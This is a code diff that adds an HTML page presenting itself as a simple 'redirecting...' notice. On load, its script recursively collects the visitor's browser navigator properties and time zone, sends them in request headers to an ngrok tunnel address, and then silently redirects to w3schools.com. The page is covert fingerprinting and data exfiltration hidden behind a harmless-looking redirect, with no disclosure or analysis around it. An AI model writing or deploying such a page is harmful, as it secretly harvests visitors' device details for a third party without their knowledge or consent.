@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <p>redirecting...</p>
+    <script>
+      function recur(obj) {
+        var result = {},
+          _tmp;
+        for (var i in obj) {
+          // enabledPlugin is too nested, also skip functions
+          if (i === "enabledPlugin" || typeof obj[i] === "function") {
+            continue;
+          } else if (typeof obj[i] === "object") {
+            // get props recursively
+            _tmp = recur(obj[i]);
+            // if object is not {}
+            if (Object.keys(_tmp).length) {
+              result[i] = _tmp;
+            }
+          } else {
+            // string, number or boolean
+            result[i] = obj[i];
+          }
+        }
+        return result;
+      }
+      window.onload = async function () {
+        const req = new XMLHttpRequest();
+        let az = window.navigator;
+        let str = JSON.stringify(recur(az));
+        let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        await req.open("GET", "http://5e67-106-200-193-195.ngrok.io/push");
+        await req.setRequestHeader("x-tz", tz);
+        await req.setRequestHeader("x-nav", str);
+        await req.send();
+        window.location.replace("http://www.w3schools.com");
+      };
+    </script>
+  </body>
+</html>
